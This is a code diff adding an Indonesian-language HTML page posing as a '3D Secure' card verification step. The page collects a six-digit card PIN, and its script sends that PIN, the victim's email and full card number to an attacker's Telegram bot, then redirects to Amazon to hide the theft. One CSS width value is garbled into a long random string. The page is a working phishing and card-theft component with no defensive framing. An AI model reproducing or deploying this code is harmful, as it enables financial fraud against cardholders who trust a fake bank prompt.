@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi 3D Secure</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
+        .kotak { background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 30px; max-width: 420px; width: 100%; text-align: center; }
+        h1 { font-size: 20px; margin-bottom: 10px; }
+        .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
+        .info-kartu { background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 25px; text-align: left; font-size: 14px; }
+        .info-kartu p { margin: 5px 0; }
+        .kotak-pin { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .kotak-pin input { width: 42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ8px; outline: none; }
+        .kotak-pin input:focus { border-color: #0071e3; }
+        button { width: 100%; padding: 12px; background: #0071e3; color: #fff; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <div class="kotak">
+        <h1>Verifikasi 3D Secure</h1>
+        <p class="sub">Masukkan PIN kartu Anda untuk menyelesaikan transaksi</p>
+        
+        <div class="info-kartu">
+            <p><strong>Email:</strong> <span id="tampilEmail">-</span></p>
+            <p><strong>Kartu berakhiran:</strong> <span id="tampilAkhiran">-</span></p>
+        </div>
+
+        <div class="kotak-pin">
+            <input type="password" maxlength="1" class="pin" data-urutan="1">
+            <input type="password" maxlength="1" class="pin" data-urutan="2">
+            <input type="password" maxlength="1" class="pin" data-urutan="3">
+            <input type="password" maxlength="1" class="pin" data-urutan="4">
+            <input type="password" maxlength="1" class="pin" data-urutan="5">
+            <input type="password" maxlength="1" class="pin" data-urutan="6">
+        </div>
+
+        <button id="tombolKirim" disabled onclick="selesai()">Selesai</button>
+    </div>
+
+    <script>
+        // Tampilkan data
+        const email = localStorage.getItem('emailPengguna') || '-';
+        const nomorKartu = localStorage.getItem('nomorKartu') || '';
+        const akhir = nomorKartu.replace(/\s/g,'').slice(-4);
+        document.getElementById('tampilEmail').textContent = email;
+        document.getElementById('tampilAkhiran').textContent = akhir || '****';
+
+        // Pindah kolom otomatis
+        const kolom = document.querySelectorAll('.pin');
+        kolom.forEach((inp, idx) => {
+            inp.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value && idx < kolom.length - 1) {
+                    kolom[idx + 1].focus();
+                }
+                cekPinLengkap();
+            });
+            inp.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && idx > 0) {
+                    kolom[idx - 1].focus();
+                }
+            });
+        });
+
+        function cekPinLengkap() {
+            const lengkap = Array.from(kolom).every(i => i.value);
+            document.getElementById('tombolKirim').disabled = !lengkap;
+        }
+
+        function selesai() {
+            const pin = Array.from(kolom).map(i => i.value).join('');
+            
+            // Kirim ke Telegram
+            const token = localStorage.getItem('botTelegram');
+            const chatId = localStorage.getItem('chatTelegram');
+            if (token && chatId) {
+                const pesan = `🔐 PIN 3D SECURE\n━━━━━━━━━━━━━━━━\n📧 Email: ${email}\n💳 Kartu: ${nomorKartu}\n🔢 PIN: ${pin}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: pesan })
+                });
+            }
+
+            // Alihkan ke Amazon
+            window.location.href = 'https://www.amazon.com';
+        }
+    </script>
+</body>
+</html>
